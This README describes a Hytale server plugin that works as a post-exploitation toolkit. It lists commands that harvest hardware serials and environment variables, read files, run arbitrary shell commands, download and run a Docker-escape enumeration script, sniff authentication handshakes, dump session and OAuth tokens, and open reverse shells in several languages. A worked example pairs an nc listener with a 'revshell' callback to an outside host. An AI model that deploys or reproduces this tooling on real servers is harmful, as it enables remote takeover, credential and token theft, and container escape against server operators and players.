# HytaleIntelligence

A Hytale server plugin for 
- host enumeration (CPU, Disks, Networking, Operating System, hwid) 
- docker container inspection
- os shell
- session (refresh, validation, invalidation)
- Java (version, cacerts)
- ls, cat
- show server certificate
- authentication handshake sniffer

## Commands

| Command                               | Description | Permission |
|---------------------------------------|-------------|------------|
| `sysinfo`                             | CPU, cloud provider (AWS/GCP/Azure), virtualization type, network interfaces, external IPs, environment variables | `hytale.intelligence.info` |
| `mem`                                 | JVM heap/non-heap memory, memory pools, /proc/meminfo, container memory limits, `free -h` | `hytale.intelligence.info` |
| `osinfo`                              | OS release files, kernel version/hostname, machine-id, whoami/id/groups, DMI hardware identity | `hytale.intelligence.info` |
| `container`                           | Docker detection, container runtime, cgroup info, memory/CPU limits, DNS resolv.conf | `hytale.intelligence.info` |
| `disk`                                | Disk space via Java FileStore and `df -h`, inode usage, mount points | `hytale.intelligence.info` |
| `javainfo`                            | Java version/vendor/home, JVM name/version/args, GC stats, uptime, PID | `hytale.intelligence.info` |
| `hwid`                                | BIOS/mainboard/chassis serial numbers, memory DIMM serials, CPU IDs, disk serials, MAC addresses, PCI/USB devices | `hytale.intelligence.info` |
| `cacerts`                             | JVM TrustStore CA certificate count. Use `cacerts -a` to list all with CN, issuer, validity, algorithm | `hytale.intelligence.info` |
| `ls [flags] [path]`                   | List directory contents. Flags: `-l` long format, `-a` hidden files, `-h` human sizes, `-s` block sizes | `hytale.intelligence.filesystem` |
| `cat [-n] <file>`                     | Read and display file contents. `-n` shows line numbers | `hytale.intelligence.filesystem` |
| `sh <command>`                        | Execute arbitrary shell commands via `/bin/sh -c`. Supports pipes, redirects, etc. 30s timeout | `hytale.intelligence.shell` |
| `deepce [flags]`                      | Downloads and runs [deepce.sh](https://github.com/stealthcopter/deepce) for Docker enumeration and escape detection | `hytale.intelligence.shell` |
| `lag`                                 | World tick/alive/paused status, CPU usage, load average, IO wait, CPU steal, thread count, deadlock detection, GC pressure, uptime | `hytale.intelligence.info` |
| `network`                             | Network interfaces (IPs, MACs, MTU, state), `ip addr`, routing table, ARP/neighbors, DNS, /etc/hosts, listening ports, active connections, firewall rules, external IP | `hytale.intelligence.info` |
| `authdump [start\|stop\|show\|clear]` | Intercept and dump auth handshake packets (Connect, AuthGrant, AuthToken, ServerAuthToken, ConnectAccept) with JWT decoding. Uses raw PacketWatcher to capture pre-auth traffic | `hytale.intelligence.shell` |
| `cert`                                | Show server TLS/QUIC certificate via `ServerAuthManager.getServerCertificate()`: subject, issuer, serial, validity, key type, self-signed check, SHA-256 + auth fingerprint, PEM | `hytale.intelligence.info` |
| `session`                             | Auth state (mode, status, expiry, session ID), session/identity/OAuth tokens with JWT decode, selected profile, game session, auth-related env vars. Uses `ServerAuthManager` | `hytale.intelligence.info` |
| `session-reload`                      | Refresh the game session via POST to `sessions.hytale.com/game-session/refresh` | `hytale.intelligence.shell` |
| `session-terminate`                   | Terminate the game session via DELETE to `sessions.hytale.com/game-session` | `hytale.intelligence.shell` |
| `session-validate`                    | Validate session and identity JWT signatures against JWKS public keys from `sessions.hytale.com/.well-known/jwks.json` (Ed25519/EdDSA) | `hytale.intelligence.shell` |
| `session-logout`                      | Call `ServerAuthManager.logout()` to clear auth session. Shows auth state before/after | `hytale.intelligence.shell` |
| `session-shutdown`                    | Call `ServerAuthManager.shutdown()` to stop the auth manager and refresh scheduler. Shows auth state before/after | `hytale.intelligence.shell` |
| `revshell <host>:<port> [type]`       | Reverse shell. Types: `sh` (default), `bash`, `python`, `perl`, `nc`, `nce`, `ruby`, `php`, `socat`. `revshell stop` to kill, `revshell status` to check | `hytale.intelligence.shell` |

## Permissions

| Permission | Access Level |
|------------|-------------|
| `hytale.intelligence.info` | System information commands (sysinfo, mem, osinfo, container, disk, javainfo, hwid, cacerts, lag, session, net, cert) |
| `hytale.intelligence.filesystem` | Filesystem access commands (ls, cat) |
| `hytale.intelligence.shell` | Shell execution and session management commands (sh, deepce, session-reload, session-terminate, session-validate, session-logout, session-shutdown, authdump, revshell) |

Grant permissions via:
```
/perm user <player> add hytale.intelligence.info
/perm user <player> add hytale.intelligence.filesystem
/perm user <player> add hytale.intelligence.shell
```

Operators have all permissions by default.

## Reverse Shell Example

```bash
# 1. On your machine, start a listener
nc -lvnp 4444

# 2. In-game, check what tools are available on the server
revshell check

# Example output:
#   Always available (Java):
#     sh     - Java Socket + /bin/sh    OK
#     bash   - Java Socket + /bin/bash  OK
#   External tools:
#     python - Python pty shell         OK (/usr/bin/python3 Python 3.11.2)
#     perl   - Perl socket shell        NOT FOUND
#     nc     - Netcat (mkfifo pipe)     OK (/usr/bin/nc)
#     socat  - Socat full PTY shell     NOT FOUND
#   ...
#   Recommended: python (PTY via pty.spawn)

# 3. Connect back using the recommended method
revshell 10.0.0.1:4444 python

# Or use the Java-native method (always available, no external tools needed)
revshell 10.0.0.1:4444

# 4. Check connection status
revshell status

# 5. Kill the reverse shell when done
revshell stop
```

## Links

- https://github.com/adaliszk/gradle-scaffoldit-modkit
- https://github.com/HytaleModding/plugin-template
- https://hytalemodding.dev/en/docs
- https://github.com/noel-lang/hytale-example-plugin

Documentation: https://rentry.co/gykiza2m
## Connect to Hytale Server and get Certificate

```
openssl s_client \
  -connect 127.0.0.1:5520 \
  -quic \
  -alpn hytale/2 \
  -servername 127.0.0.1
Connecting to 127.0.0.1
CONNECTED(00000003)
depth=0 CN=localhost
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=localhost
verify return:1
---
Certificate chain
 0 s:CN=localhost
   i:CN=localhost
   a:PKEY: RSA, 2048 (bit); sigalg: sha256WithRSAEncryption
   v:NotBefore: Feb 15 07:10:42 2025 GMT; NotAfter: Dec 31 23:59:59 9999 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIICqjCCAZKgAwIBAgIIVPGQp2mIJ5owDQYJKoZIhvcNAQELBQAwFDESMBAGA1UE
AwwJbG9jYWxob3N0MCAXDTI1MDIxNTA3MTA0MloYDzk5OTkxMjMxMjM1OTU5WjAU
MRIwEAYDVQQDDAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
AoIBAQCkoQ/2EVlogyVlbk5AS1VY1RhuBs4MtFLuDs6aS54cGUgURWn1Dkcf60Hs
y+gAhCXzTX5Q4GvLAH3QVadsS+y2XUr5Wj4EniOH7iOPiGSEjn5MwvCn9veEx7qT
c/9Qyh0ceuqakXdMHydeRVTaHbCzUeHJdPNUMO8z6wkyJpWHzhUeUyxrdxS5HkK+
wLQGUDeJC6H+S1Ijd/j9GqhvqqWngoC3TK+I9J5e77u1h1rC6U/uCVUrv9ucuIxC
pc178h8IGxWQ4+AQf1O61njEU6sJFVeM34RjtLCn5QQ8s+s5J7wfJyfryd6cxDfr
lj6sQHEusXKQCsX92SypLJVZ4KETAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAFCd
TddYkhBX8PlpGMcNFvRuMic+/iFsY9le+dBYHl5rBJjpF+vbsmIBoPnDFufHxXfO
WDd3iED8UO7VRGGu3sgD8YbI5rolDJ0mgGlEYHSfEYg2KZ9zdRUKhRH4w0Bb5aMN
9vmJtMCu3XpSe+uGzhHk4xgwM+KvqeAWY85WCZJblHuJ4ir2EXntikMUxD3vT3CR
nkThfBR926xIN/lYAi2dT81E1cGU6SgZdoqHW20iC1B6g3AvWF5biLCzueOjfbW8
QMAkHV68t7mAiXwvkQNxarB9u0KBmp4CplXikM+s1e6kXGk4aCJ1Jne8heUyV6In
/jxvwPusc8Or3rnT0vI=
-----END CERTIFICATE-----
subject=CN=localhost
issuer=CN=localhost
---
No client certificate CA names sent
Requested Signature Algorithms: ECDSA+SHA256:RSA-PSS+SHA256:RSA+SHA256:ECDSA+SHA384:RSA-PSS+SHA384:RSA+SHA384:RSA-PSS+SHA512:RSA+SHA512:RSA+SHA1
Shared Requested Signature Algorithms: ECDSA+SHA256:RSA-PSS+SHA256:RSA+SHA256:ECDSA+SHA384:RSA-PSS+SHA384:RSA+SHA384:RSA-PSS+SHA512:RSA+SHA512
Peer signing digest: SHA256
Peer signature type: rsa_pss_rsae_sha256
Peer Temp Key: X25519, 253 bits
---
SSL handshake has read 0 bytes and written 0 bytes
Verification error: self-signed certificate
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Protocol: QUICv1
Server public key is 2048 bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
ALPN protocol: hytale/2
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID:
    Session-ID-ctx:
    Resumption PSK:
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    Start Time: 1771139996
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
```

```
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 6120832417277683610 (0x54f190a76988279a)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=localhost
        Validity
            Not Before: Feb 15 07:10:42 2025 GMT
            Not After : Dec 31 23:59:59 9999 GMT
        Subject: CN=localhost
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:a4:a1:0f:f6:11:59:68:83:25:65:6e:4e:40:4b:
                    55:58:d5:18:6e:06:ce:0c:b4:52:ee:0e:ce:9a:4b:
                    9e:1c:19:48:14:45:69:f5:0e:47:1f:eb:41:ec:cb:
                    e8:00:84:25:f3:4d:7e:50:e0:6b:cb:00:7d:d0:55:
                    a7:6c:4b:ec:b6:5d:4a:f9:5a:3e:04:9e:23:87:ee:
                    23:8f:88:64:84:8e:7e:4c:c2:f0:a7:f6:f7:84:c7:
                    ba:93:73:ff:50:ca:1d:1c:7a:ea:9a:91:77:4c:1f:
                    27:5e:45:54:da:1d:b0:b3:51:e1:c9:74:f3:54:30:
                    ef:33:eb:09:32:26:95:87:ce:15:1e:53:2c:6b:77:
                    14:b9:1e:42:be:c0:b4:06:50:37:89:0b:a1:fe:4b:
                    52:23:77:f8:fd:1a:a8:6f:aa:a5:a7:82:80:b7:4c:
                    af:88:f4:9e:5e:ef:bb:b5:87:5a:c2:e9:4f:ee:09:
                    55:2b:bf:db:9c:b8:8c:42:a5:cd:7b:f2:1f:08:1b:
                    15:90:e3:e0:10:7f:53:ba:d6:78:c4:53:ab:09:15:
                    57:8c:df:84:63:b4:b0:a7:e5:04:3c:b3:eb:39:27:
                    bc:1f:27:27:eb:c9:de:9c:c4:37:eb:96:3e:ac:40:
                    71:2e:b1:72:90:0a:c5:fd:d9:2c:a9:2c:95:59:e0:
                    a1:13
                Exponent: 65537 (0x10001)
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        50:9d:4d:d7:58:92:10:57:f0:f9:69:18:c7:0d:16:f4:6e:32:
        27:3e:fe:21:6c:63:d9:5e:f9:d0:58:1e:5e:6b:04:98:e9:17:
        eb:db:b2:62:01:a0:f9:c3:16:e7:c7:c5:77:ce:58:37:77:88:
        40:fc:50:ee:d5:44:61:ae:de:c8:03:f1:86:c8:e6:ba:25:0c:
        9d:26:80:69:44:60:74:9f:11:88:36:29:9f:73:75:15:0a:85:
        11:f8:c3:40:5b:e5:a3:0d:f6:f9:89:b4:c0:ae:dd:7a:52:7b:
        eb:86:ce:11:e4:e3:18:30:33:e2:af:a9:e0:16:63:ce:56:09:
        92:5b:94:7b:89:e2:2a:f6:11:79:ed:8a:43:14:c4:3d:ef:4f:
        70:91:9e:44:e1:7c:14:7d:db:ac:48:37:f9:58:02:2d:9d:4f:
        cd:44:d5:c1:94:e9:28:19:76:8a:87:5b:6d:22:0b:50:7a:83:
        70:2f:58:5e:5b:88:b0:b3:b9:e3:a3:7d:b5:bc:40:c0:24:1d:
        5e:bc:b7:b9:80:89:7c:2f:91:03:71:6a:b0:7d:bb:42:81:9a:
        9e:02:a6:55:e2:90:cf:ac:d5:ee:a4:5c:69:38:68:22:75:26:
        77:bc:85:e5:32:57:a2:27:fe:3c:6f:c0:fb:ac:73:c3:ab:de:
        b9:d3:d2:f2
```